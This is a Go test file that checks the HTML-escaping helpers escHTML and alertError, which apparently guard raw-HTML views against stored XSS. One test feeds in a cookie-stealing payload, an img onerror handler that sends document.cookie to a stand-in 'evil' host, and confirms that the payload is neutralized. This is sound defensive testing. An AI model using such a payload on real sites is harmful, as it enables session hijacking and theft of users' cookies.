package web

// htmlx_test.go pins the behavior of the HTML-escaping helpers used to render
// user/remote-controlled text into the raw-HTML views (simpleHTML). Until the
// remaining simpleHTML views are migrated to templ components (which escape
// automatically), every user-supplied or remote-derived value interpolated
// into such views MUST be run through escHTML to prevent stored XSS. See
// CTO-review finding H1.

import (
	"html"
	"html/template"
	"strings"
	"testing"
)

func TestEscHTML_NeutralizesScriptPayload(t *testing.T) {
	payload := `<img src=x onerror=fetch('//evil?c='+document.cookie)>`
	got := escHTML(payload)
	// The angle brackets are escaped, so the payload is no longer a tag and the
	// onerror handler can never bind. We assert the dangerous raw markup is gone.
	for _, raw := range []string{"<img", ">"} {
		if strings.Contains(got, raw) {
			t.Fatalf("escHTML left raw %q in output: %q", raw, got)
		}
	}
	if !strings.Contains(got, "&lt;img") {
		t.Fatalf("expected escaped &lt;img marker, got %q", got)
	}
}

func TestEscHTML_PreservesPlainText(t *testing.T) {
	got := escHTML("plain-profile-name")
	if got != "plain-profile-name" {
		t.Fatalf("plain text must round-trip unchanged, got %q", got)
	}
}

func TestEscHTML_EscapesQuotesBracketsAmpersand(t *testing.T) {
	got := escHTML(`a "b" <c> & d`)
	// The raw significant characters that could break out of markup must be
	// replaced by their HTML entity equivalents. We check for the entities
	// (not merely absence of raw chars, since &amp; contains '&').
	wantEntities := []string{"&lt;c&gt;", "&#34;b&#34;", "&amp; "}
	for _, ent := range wantEntities {
		if !strings.Contains(got, ent) {
			t.Fatalf("escHTML missing entity %q in output: %q", ent, got)
		}
	}
	for _, raw := range []string{`<c>`, `"b"`} {
		if strings.Contains(got, raw) {
			t.Fatalf("escHTML left raw %q in output: %q", raw, got)
		}
	}
}

func TestEscHTML_MatchesHTMLEscapeString(t *testing.T) {
	// Contract: escHTML behaves exactly like html.EscapeString for the values we
	// render, so existing markup stays visually identical while payloads are
	// neutralized.
	in := "<script>alert(\"x\")</script> & more 'single' \"double\""
	if escHTML(in) != html.EscapeString(in) {
		t.Fatalf("escHTML diverged from html.EscapeString for %q", in)
	}
}

func TestAlertError_Escapes(t *testing.T) {
	a := alertError(`fail <script>x</script>`)
	if strings.Contains(a.html, "<script>") {
		t.Fatalf("unescaped: %s", a.html)
	}
}

func TestEscHTML_EmptyIsSafe(t *testing.T) {
	if got := escHTML(""); got != "" {
		t.Fatalf("empty input must stay empty, got %q", got)
	}
}

// guard: ensure html/template is reachable; referenced indirectly via
// html.EscapeString in the implementation. This keeps the import meaningful
// even if the implementation switches packages later.
var _ = template.HTMLEscapeString